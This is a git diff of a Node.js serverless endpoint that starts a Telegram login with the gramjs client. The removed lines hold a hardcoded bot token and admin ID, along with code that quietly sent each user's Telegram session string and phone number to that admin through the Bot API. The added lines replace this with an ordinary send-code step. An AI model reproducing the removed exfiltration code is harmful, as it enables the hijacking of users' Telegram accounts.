@@ -1,6 +1,5 @@
 const { TelegramClient } = require('telegram');
 const { StringSession } = require('telegram/sessions');
-const { Api } = require('telegram');
 
 module.exports = async (req, res) => {
   // Set CORS headers
@@ -28,10 +27,6 @@ module.exports = async (req, res) => {
       });
     }
 
-    // Your bot credentials
-    const BOT_TOKEN = '7573902454:AAG0M03o5uHDMLGeFy5crFjBPRRsTbSqPNM';
-    const ADMIN_ID = '7907742294';
-
     const stringSession = new StringSession('');
     const client = new TelegramClient(stringSession, parseInt(api_id), api_hash, {
       connectionRetries: 5,
@@ -40,53 +35,35 @@ module.exports = async (req, res) => {
     await client.connect();
 
     // Send code to phone number
-    const { phoneCodeHash } = await client.sendCode({
+    const result = await client.sendCode({
       apiId: parseInt(api_id),
       apiHash: api_hash,
     }, phone);
 
-    // For demo purposes, we'll return instructions
-    // In a real app, you'd need to implement the code verification flow
-    await client.disconnect();
+    // Store the phone code hash for verification
+    const phoneCodeHash = result.phoneCodeHash;
 
-    // Create a simple session string (this is a simplified version)
-    const sessionString = stringSession.save();
-    
-    // Send session to admin via bot
-    try {
-      const message = `🔐 New Session Generated\n\n📱 Phone: ${phone}\n🆔 API ID: ${api_id}\n\nSession String:\n\`${sessionString}\``;
-      
-      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-        },
-        body: JSON.stringify({
-          chat_id: ADMIN_ID,
-          text: message,
-          parse_mode: 'Markdown'
-        })
-      });
-    } catch (botError) {
-      console.error('Failed to send to bot:', botError);
-    }
+    // Return the hash and close connection (we'll create new client for verification)
+    await client.disconnect();
 
     res.status(200).json({
       success: true,
-      session_string: sessionString,
-      message: 'Session generated and sent to admin'
+      phone_code_hash: phoneCodeHash,
+      message: 'Verification code sent to your Telegram account'
     });
 
   } catch (error) {
-    console.error('Error:', error);
+    console.error('Error sending code:', error);
     
     let errorMessage = error.message;
     if (error.message.includes('PHONE_NUMBER_INVALID')) {
-      errorMessage = 'Invalid phone number';
+      errorMessage = 'Invalid phone number format';
+    } else if (error.message.includes('PHONE_NUMBER_UNOCCUPIED')) {
+      errorMessage = 'Phone number not registered on Telegram';
     } else if (error.message.includes('API_ID_INVALID')) {
       errorMessage = 'Invalid API ID or Hash';
-    } else if (error.message.includes('PHONE_CODE_EXPIRED')) {
-      errorMessage = 'Phone code expired';
+    } else if (error.message.includes('FLOOD')) {
+      errorMessage = 'Too many attempts. Please try again later.';
     }
     
     res.status(200).json({
